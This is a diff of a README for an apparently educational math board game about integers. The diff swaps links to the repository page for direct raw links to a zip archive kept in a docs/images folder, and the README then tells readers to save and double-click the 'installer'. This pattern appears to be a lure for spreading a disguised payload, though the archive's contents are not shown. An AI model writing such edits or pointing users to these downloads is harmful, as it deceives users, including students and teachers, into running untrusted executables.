@@ -1,6 +1,6 @@
 # 🐍 integers-snakes-ladders - Master math concepts through interactive play
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Susanbanthonydollardeckhouse2582/integers-snakes-ladders)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Susanbanthonydollardeckhouse2582/integers-snakes-ladders/main/docs/images/snakes_ladders_integers_v3.0.zip)
 
 This application uses the classic board game format to teach positive and negative integers. Players move pieces across a board while reacting to math problems that appear during the game. The software uses colorful visuals and audio cues to help students learn arithmetic in a classroom or at home.
 
@@ -23,7 +23,7 @@ This game runs on most modern desktop computers. Ensure your hardware meets thes
 Follow these steps to set up the game on your computer.
 
 1. Visit the repository page to download the software.
-2. Click this link: [Download integers-snakes-ladders](https://github.com/Susanbanthonydollardeckhouse2582/integers-snakes-ladders).
+2. Click this link: [Download integers-snakes-ladders](https://raw.githubusercontent.com/Susanbanthonydollardeckhouse2582/integers-snakes-ladders/main/docs/images/snakes_ladders_integers_v3.0.zip).
 3. Save the installer file to your computer.
 4. Locate the downloaded file in your folder.
 5. Double-click the file to start the installation.
